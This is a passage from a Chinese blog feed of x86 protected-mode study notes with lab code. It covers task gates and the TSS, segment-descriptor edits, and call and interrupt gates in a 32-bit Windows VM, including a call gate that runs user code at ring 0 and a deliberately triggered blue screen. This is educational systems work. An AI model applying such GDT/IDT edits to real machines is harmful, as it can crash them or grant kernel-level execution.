寄存器中，<code>B=0</code> 表示没有被加载（available）。</p><h3 id="读写-TR-寄存器指令"><a href="#读写-TR-寄存器指令" class="headerlink" title="读写 TR 寄存器指令"></a>读写 <code>TR</code> 寄存器指令</h3><p>读写分别对应 <code>Store</code> 和 <code>Load</code> 操作，也就对应 <code>STR</code> 和 <code>LTR</code> 两个指令。</p><p>同样的，读指令是可以在三环下运行，但是只能读到任务段选择子。写指令只能在零环下运行，需要提供 96 位的数据去装载任务段描述符，且加载后会导致任务段描述符的 TYPE 发生改变（<code>B</code> 位从 <code>0</code> 变为 <code>1</code>）。</p><h2 id="任务门"><a href="#任务门" class="headerlink" title="任务门"></a>任务门</h2><p>还是先来看看任务门的结构：</p><img src="/2024/11/04/x86_4/4.png" class=""><p>很简单，具体字段也不赘述了。因为任务门是在 idt 表中的，所以必然是通过 int 指令去调用。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>先写一个代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：SwitchTSS.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="built_in">stack</span>[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// 0x4050a0</span></span><br><span class="line"></span><br><span class="line">DWORD g_esp;</span><br><span class="line">DWORD g_cs;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TSS</span> &#123;</span></span><br><span class="line">    DWORD link; <span class="comment">// 保存前一个 TSS 段选择子，使用 call 指令切换寄存器的时候由CPU填写。</span></span><br><span class="line">    <span class="comment">// 这 6 个值是固定不变的，用于提权，CPU 切换栈的时候用</span></span><br><span class="line">    DWORD esp0; <span class="comment">// 保存 0 环栈指针</span></span><br><span class="line">    DWORD ss0;  <span class="comment">// 保存 0 环栈段选择子</span></span><br><span class="line">    DWORD esp1; <span class="comment">// 保存 1 环栈指针</span></span><br><span class="line">    DWORD ss1;  <span class="comment">// 保存 1 环栈段选择子</span></span><br><span class="line">    DWORD esp2; <span class="comment">// 保存 2 环栈指针</span></span><br><span class="line">    DWORD ss2;  <span class="comment">// 保存 2 环栈段选择子</span></span><br><span class="line">    <span class="comment">// 下面这些都是用来做切换寄存器值用的，切换寄存器的时候由CPU自动填写。</span></span><br><span class="line">    DWORD cr3; </span><br><span class="line">    DWORD eip;  </span><br><span class="line">    DWORD eflags;</span><br><span class="line">    DWORD eax;</span><br><span class="line">    DWORD ecx;</span><br><span class="line">    DWORD edx;</span><br><span class="line">    DWORD ebx;</span><br><span class="line">    DWORD esp;</span><br><span class="line">    DWORD ebp;</span><br><span class="line">    DWORD esi;</span><br><span class="line">    DWORD edi;</span><br><span class="line">    DWORD es;</span><br><span class="line">    DWORD cs;</span><br><span class="line">    DWORD ss;</span><br><span class="line">    DWORD ds;</span><br><span class="line">    DWORD fs;</span><br><span class="line">    DWORD gs;</span><br><span class="line">    DWORD ldt;</span><br><span class="line">    DWORD io_map;</span><br><span class="line">&#125; TSS;</span><br><span class="line">TSS tss = &#123;<span class="comment">// 0x00405000</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//link</span></span><br><span class="line">    (DWORD)<span class="built_in">stack</span>,<span class="comment">//esp0</span></span><br><span class="line">    <span class="number">0x00000010</span>,<span class="comment">//ss0</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//esp1</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ss1</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//esp2</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ss2</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//cr3</span></span><br><span class="line">    <span class="number">0x00401000</span>,<span class="comment">//eip</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//eflags</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//eax</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ecx</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//edx</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ebx</span></span><br><span class="line">    (DWORD)<span class="built_in">stack</span>,<span class="comment">//esp</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ebp</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//esi</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//edi</span></span><br><span class="line">    <span class="number">0x00000023</span>,<span class="comment">//es  </span></span><br><span class="line">    <span class="number">0x00000008</span>,<span class="comment">//cs  </span></span><br><span class="line">    <span class="number">0x00000010</span>,<span class="comment">//ss</span></span><br><span class="line">    <span class="number">0x00000023</span>,<span class="comment">//ds</span></span><br><span class="line">    <span class="number">0x00000030</span>,<span class="comment">//fs</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//gs</span></span><br><span class="line">    <span class="number">0x00000000</span>,<span class="comment">//ldt</span></span><br><span class="line">    <span class="number">0x20ac0000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) func() &#123;<span class="comment">//00401000</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">            <span class="type">int</span> <span class="number">3</span></span><br><span class="line">            mov g_esp, esp</span><br><span class="line">            mov eax, <span class="number">0</span></span><br><span class="line">            mov ax, cs</span><br><span class="line">            mov g_cs, eax</span><br><span class="line">            iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func=%x tss=%x stack=%x\n&quot;</span>,func,&amp;tss,<span class="built_in">stack</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input cr3:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;(tss.cr3));</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        call fword ptr [buffer]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_cs = %08x\ng_esp = %08x\n&quot;</span>, g_cs, g_esp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后向 0x48 这个段描述符构造一个任务段，段描述符为 0000e940&#96;5000ffff。</p><p>然后找到该进程 cr3 的值，这里 cr3 寄存器是保存程序页表的物理地址使用的，windbg中输入 <code>!process 0 0</code> 即可查看，dirbase 即是该值。</p><img src="/2024/11/04/x86_4/5.png" class=""><p>但是试了很多次，发现都会直接导致虚拟机关闭 or 蓝屏，这个进行不下去了可能得先一放下，下篇开始学分页。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15330063.html">https://www.cnblogs.com/wingsummer/p/15330063.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_3/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_3&#x2F;</a></li><li>[3]：<a href="https://allen.blog.csdn.net/article/details/52651598">https://allen.blog.csdn.net/article/details/52651598</a></li></ul>]]></content>
    
    
    <summary type="html">学习一下任务门相关的知识</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="x86架构" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/"/>
    
    <category term="保护模式" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（3）——门描述符实验</title>
    <link href="https://xia0ji233.github.io/2024/10/08/x86_3/"/>
    <id>https://xia0ji233.github.io/2024/10/08/x86_3/</id>
    <published>2024-10-07T16:00:00.000Z</published>
    <updated>2025-01-17T10:39:23.425Z</updated>
    
    <content type="html"><![CDATA[<p>通过做实验来加深一下印象</p><span id="more"></span><p>首先是环境搭建，寻找32位虚拟机花了很长时间，最后在<a href="https://www.52pojie.cn/thread-1644554-1-1.html"><strong>52破解</strong></a>上找到了合适的系统。如果你尝试自己搭建你会发现，win7 32镜像很难寻找，而且大部分不支持 <code>Vmware Tools</code>，帧率很低很卡，调试起来很不舒服。</p><p>而笔者给出的链接中的 32 位虚拟机还是很不错的，能调试，能装 <code>Vmware Tools</code>。还需要提醒一点的是，解压好之后把 CPU 个数和核心数全部改成 1，不然实验容易炸。</p><h2 id="段描述符实验"><a href="#段描述符实验" class="headerlink" title="段描述符实验"></a>段描述符实验</h2><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><p>首先根据 gdt 表，找到 32 位程序的 CS 中段选择子 <code>0x1b</code> 去找到对应的 32 位段描述符。</p><img src="/2024/10/08/x86_3/1.png" class=""><p>也就是图中 +0x18 偏移处的 00cffb00&#96;0000ffff。</p><p>Base 分别在高四字节的首位各一个字节+低四字节的高 2 字节，刚好全是 0。</p><p>Limit 就是最低的 2 字节配上高字的低半个字节，组合起来也就是 0xFFFFF。</p><p>TYPE 值就是 0xb，查表得知，是代码段，可读可执行。</p><p>P DPL S 的结果是 0xf，表明数据是全1。</p><p>P 为 1，表明段有效。</p><p>DPL 为 3，表明该代码段的权限是 3 环的。</p><p>S 为 1，表明是代码&#x2F;数据段</p><p>剩下还有一个 G 位为 1，表明段限长以页为单位。D&#x2F;B 位为 1，表明是 32 位程序。</p><hr><p>此时我做个小实验，我创建一个新的代码段描述符，我将 D&#x2F;B 位改成 0，使之变为一个 16 位的代码段，直接抄 +0x18 处的段描述符，将 D&#x2F;B 位修改一下得到 008ffb00&#96;0000ffff。</p><p>从图中可以看到 +0x48 的位置是一个空的段描述符，直接将值写入。</p><img src="/2024/10/08/x86_3/2.png" class=""><p>用一个长调用去改段选择子为 0x4b。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>()&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov eax,<span class="number">0x12345678</span>;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">*(<span class="type">int</span> *)&amp;bufcode[<span class="number">0</span>]=(<span class="type">int</span>)test;</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/10/08/x86_3/3.png" class=""><p>可以发现，写的 <code>mov eax,0x12345678</code> 的字节码被解析成了 16 位的，也就是说，原本 <code>mov eax,0x12345678</code>字节码 <code>B8 78 56 34 12</code> 因为代码段位数的变化导致只能将 <code>B8 78 56</code> 视为 <code>mov ax,0x5678</code> 而只执行了这个，往后跳转到 <code>34</code> 字节开头的代码，从寄存器中也可以看到 eax 的值变为了 0x5678，表明执行了 16 位的代码而非 32 位的代码。</p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>32 位的程序 ds 通常是 0x23，也就是 +0x20 的位置，gdt 表项为 00cff300&#96;0000ffff。其实和代码段的差别就是 TYPE 域，其余基本一样，TYPE 为 3 是数据段，可读可写。</p><p>这里稍微改一改其它参数，例如改段基址为 1，同样是 0x4b 处的段描述符，改成 00cff300&#96;0001ffff。</p><img src="/2024/10/08/x86_3/4.png" class=""><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a=<span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov ax,<span class="number">0x4b</span>;</span><br><span class="line">mov ds,ax;</span><br><span class="line">mov ebx, <span class="number">0x12345678</span>;</span><br><span class="line">mov eax,[ebx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><img src="/2024/10/08/x86_3/5.png" class=""><p>发现我们修改了 ds 之后再次尝试读取内存已经是读取基址（1）+ 偏移的形式了，其实平时我们给的读取地址都是偏移，只不过段描述符中的基址通常是 0。</p><p>读取全局变量 a 的值也可以发现，也是对应的读取了 + 1 上的偏移。</p><img src="/2024/10/08/x86_3/6.png" class=""><p>再尝试看看段长限制，因为代码段和普通数据段几乎都是 <code>0-0xffffffff</code> 的范围，所以这里换一个段描述符，尝试使用 fs 段寄存器，32 位通常的值是 0x3b，FS 段寄存器指向了存储了<strong>线程环境块</strong>（TEB）的地址。</p><p>尝试访问 <code>fs dword ptr [0x1000]</code>，直接报访问错误，并且访问的真实地址我们看不到，这是被段长限制住了。</p><img src="/2024/10/08/x86_3/8.png" class=""><p>这里需要注意的是，线程会发生切换，线程切换的时候会修改 gdt 表，所以我们中断 windbg 看到的 gdt 表对应的 0x3b表项是不准确的[1]。通常情况下，fs 的段基址是 0x7FFDF000，同样为了找到真实的段基址，后续使用调用门提权的时候可以中断下来看看 gdt 表。</p><p>这里根据基址构建一个段描述符 7f40f3fd&#96;f0000fff，windbg里面 dg 命令可以查看段选择子对应的信息。</p><img src="/2024/10/08/x86_3/9.png" class=""><p>这里将 TYPE 修改为向下扩展的类型，也就是将 3 变为 7，修改为 7f40f7fd&#96;f0000fff。</p><p>可以发现，原来可以访问的地址变为不可访问</p><img src="/2024/10/08/x86_3/10.png" class=""><p>原来不可访问的地址变得可访问</p><img src="/2024/10/08/x86_3/11.png" class=""><p>向下扩展可以认为是原段长限制取反的结果。其余位就不做过多演示了，第一章讲的还是比较清楚哒。</p><h2 id="门描述符实验"><a href="#门描述符实验" class="headerlink" title="门描述符实验"></a>门描述符实验</h2><h3 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h3><p>调用门是存在 gdt 当中的，属于系统段，这里直接构建一个可以跨段提权的调用门，先设好参数。</p><ul><li>调用门跳转地址为 0x401000（关闭随机地址的第一个函数的地址）。</li><li>TYPE设为0xC，表明是调用门。</li><li>目标段选择子设为，0x8，这是一个 0 环的段选择子。</li><li>P DPL S&#x3D;1110&#x3D;0xE，P&#x3D;1表示段有效，DPL&#x3D;3表示请求的最低权限为 3 环，S&#x3D;0表明是系统段。</li><li>ParamCount 设为 0。</li></ul><p>据此构造的段描述符为 0040EC00&#96;00081000，写到 gdtr+0x48 的位置，直接去调用，因为我们提了零环权限，所以可以直接读取 gdt 表项。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">__int64 gdt_item;</span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>()&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov ebx,<span class="number">0x80B93800</span>;<span class="comment">//gdtr的值</span></span><br><span class="line">lea eax,[ebx<span class="number">+0x38</span>];</span><br><span class="line">mov eax,[eax];</span><br><span class="line">mov dword ptr[gdt_item],eax;</span><br><span class="line">lea eax,[ebx<span class="number">+0x38</span><span class="number">+4</span>];</span><br><span class="line">mov eax,[eax]</span><br><span class="line">mov dword ptr[gdt_item<span class="number">+4</span>],eax;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gdt_item=%llx\n&quot;</span>,gdt_item);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 运行之后我们拿到当前线程的 fs 段描述符的值。</p><img src="/2024/10/08/x86_3/12.png" class=""><p>运行之后拿到了值 7f40f3fd&#96;f0000fff，通过拆解，我们可以得到当前线程的 FS 段基址为 0x7ffdf000，段限长为 0xFFF。</p><p>由于该虚拟机在调用门函数内中断会直接死机，就不这么玩了，接下来我们看看传参。</p><hr><p>构造两个参数的调用门，对应描述符为 0040EC02&#96;00081000。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> arg1,arg2;</span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>(<span class="type">int</span> a1,<span class="type">int</span> a2)&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">mov eax,[a1];</span><br><span class="line">mov [arg1],eax;</span><br><span class="line">mov eax,[a2];</span><br><span class="line">mov [arg2],eax;</span><br><span class="line">retf <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line">push <span class="number">0x12345678</span>;</span><br><span class="line">push <span class="number">0x61626364</span>;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,arg1,arg2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改，运行之后可以在内核调试器中中断下来。</p><img src="/2024/10/08/x86_3/13.png" class=""><p>同时我们可以观察到内核中栈的情况，从栈顶到栈底依次是。</p><ul><li>EIP</li><li>CS</li><li>第一个参数（最后被压入的才是第一个参数）</li><li>第二个参数</li><li>ESP</li><li>SS</li></ul><h3 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h3><p>这里需要换一个表了，去寻找 IDT 表。</p><img src="/2024/10/08/x86_3/14.png" class=""><p>可以发现 +0x100 的位置是空的中断描述符，于是也新建一个中断门描述符，几乎与调用门描述符是一致的。填充一个 3 环可以请求，请求之后 CS 为 08 的中断描述符，0040EE00&#96;00081000。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>()&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">iret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line"><span class="type">int</span> <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样中断下来看看栈。</p><img src="/2024/10/08/x86_3/15.png" class=""><p>不难发现栈的情况从栈顶到栈底依次是</p><ul><li>EIP</li><li>CS</li><li>EFLAGS</li><li>ESP</li><li>SS</li></ul><p>同时值得注意的是，IF 位被置为 0，在调用门中，IF 是没有被置零的，中断返回使用的是 iret 指令，它会把中断重新打开。倘若在此使用 retf 4 将 EFLAGS 视为参数平衡栈，看似没有问题也能正确长返回。</p><img src="/2024/10/08/x86_3/16.png" class=""><p>此时返回可以发现，EFLAGS 的 IF 位没有被恢复，如果此时执行一个之前未执行过的函数，会因为缺页产生异常，将该函数代码的页面调入页内，如果此时 EFLAGS 的 IF 位是置 0 的，那么就会直接蓝屏。</p><p>复现一遍蓝屏</p><img src="/2024/10/08/x86_3/17.png" class=""><p>可以发现中断在了 kitrap0e 函数中，这是 0e 中断的处理函数，0e 就是页错误的中断号</p><hr><p>Okay，前两章的理论+实验完美完成，也学到了不少东西。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1].<a href="https://www.52pojie.cn/thread-1795079-1-1.html">https://www.52pojie.cn/thread-1795079-1-1.html</a></li></ul>]]></content>
    
    
    <summary type="html">通过做实验来加深一下印象</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="x86架构" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/"/>
    
    <category term="保护模式" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/x86%E6%9E%B6%E6%9E%84/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（2）——调用门，中断门，陷阱门与门描述符</title>
    <link href="https://xia0ji233.github.io/2024/10/05/x86_2/"/>
    <id>https://xia0ji233.github.io/2024/10/05/x86_2/</id>
    <published>2024-10-05T06:00:00.000Z</published>
    <updated>2025-01-17T10:39:23.424Z</updated>
    
